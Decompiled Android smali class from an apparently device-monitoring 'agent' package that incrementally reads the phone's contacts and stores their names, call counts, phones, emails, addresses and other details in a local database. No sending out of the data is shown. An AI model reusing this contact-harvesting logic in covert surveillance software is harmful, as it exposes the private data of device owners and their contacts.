.class public Lcom/hp/vd/module/monitor/contact/ContactCallable;
.super Ljava/lang/Object;
.source "ContactCallable.java"

# interfaces
.implements Ljava/util/concurrent/Callable;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Ljava/util/concurrent/Callable<",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "ContactCallable"


# instance fields
.field protected contactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/module/monitor/ContactMonitor;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 36
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->context:Lcom/hp/vd/context/Context;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 37
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 38
    iput-object p2, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->context:Lcom/hp/vd/context/Context;

    .line 39
    iput-object p3, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 40
    iput-object p4, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 41
    iput-object p5, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public bridge synthetic call()Ljava/lang/Object;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 19
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/contact/ContactCallable;->call()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method public call()Ljava/lang/Void;
    .locals 12
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 50
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 51
    new-instance v8, Lcom/hp/vd/module/monitor/contact/ChildrenPersister;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 52
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactPhoneDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 53
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactEmailDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 54
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactNoteDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v4

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 55
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactInstantMessengerDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v5

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 56
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactAddressDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v6

    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 57
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContactOrganizationDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v7

    move-object v1, v8

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/contact/ChildrenPersister;-><init>(Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V

    .line 60
    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "_id > "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_contact_internal_id"

    .line 63
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v6, "_id"

    const/4 v3, 0x0

    const/4 v5, 0x0

    move-object v1, v0

    .line 60
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 68
    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "ContactCallable"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Callable$1::run(): new contacts have been found = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v2, 0x0

    const/4 v3, 0x0

    move v4, v2

    move-object v5, v3

    .line 70
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_1

    const-string v5, "_id"

    .line 72
    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "display_name"

    .line 73
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    const-string v7, "has_phone_number"

    .line 74
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    const-string v9, "times_contacted"

    .line 75
    invoke-interface {v1, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v1, v9}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    const-string v10, "contact_status_ts"

    .line 76
    invoke-interface {v1, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v1, v10}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v10

    invoke-static {v10, v11}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    add-int/lit8 v4, v4, 0x1

    .line 84
    new-instance v11, Lcom/hp/vd/data/ContactData;

    invoke-direct {v11}, Lcom/hp/vd/data/ContactData;-><init>()V

    .line 86
    iput-object v5, v11, Lcom/hp/vd/data/ContactData;->internalId:Ljava/lang/Integer;

    .line 87
    iput-object v6, v11, Lcom/hp/vd/data/ContactData;->displayName:Ljava/lang/String;

    const/4 v6, 0x1

    if-ne v7, v6, :cond_0

    goto :goto_1

    :cond_0
    move v6, v2

    .line 88
    :goto_1
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    iput-object v6, v11, Lcom/hp/vd/data/ContactData;->hasPhoneNumber:Ljava/lang/Boolean;

    .line 89
    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    iput-object v6, v11, Lcom/hp/vd/data/ContactData;->timesContacted:Ljava/lang/Integer;

    .line 90
    new-instance v6, Ljava/util/Date;

    invoke-virtual {v10}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    invoke-direct {v6, v9, v10}, Ljava/util/Date;-><init>(J)V

    iput-object v6, v11, Lcom/hp/vd/data/ContactData;->statusTimestamp:Ljava/util/Date;

    .line 92
    iget-object v6, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->contactDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v6, v11}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 98
    iget-object v6, v11, Lcom/hp/vd/data/ContactData;->id:Ljava/lang/Integer;

    invoke-virtual {v8, v5, v6, v0}, Lcom/hp/vd/module/monitor/contact/ChildrenPersister;->readAndPersistRecords(Ljava/lang/Integer;Ljava/lang/Integer;Landroid/content/ContentResolver;)V

    goto :goto_0

    .line 103
    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    if-nez v5, :cond_2

    .line 106
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ContactCallable"

    const-string v2, "call(): no rows were found with the cursor."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-object v3

    .line 111
    :cond_2
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ContactCallable"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "call(): contacts persisted = "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ", "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "max_contact_internal_id"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " = "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 121
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_contact_internal_id"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 124
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_contact_internal_id"

    invoke-virtual {v1, v2, v5}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 126
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    .line 127
    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 129
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ContactCallable"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "call(): commited max_contact_internal_id= "

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v2, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception v1

    .line 135
    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_contact_internal_id"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v2, v4, v5}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 137
    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "ContactCallable"

    const-string v5, "call(): could not commit max_contact_internal_id"

    invoke-interface {v2, v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 143
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ContactCallable"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "call(): reverted max_contact_internal_id to the old value = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v4, 0x2

    invoke-interface {v1, v2, v0, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :goto_2
    return-object v3
.end method
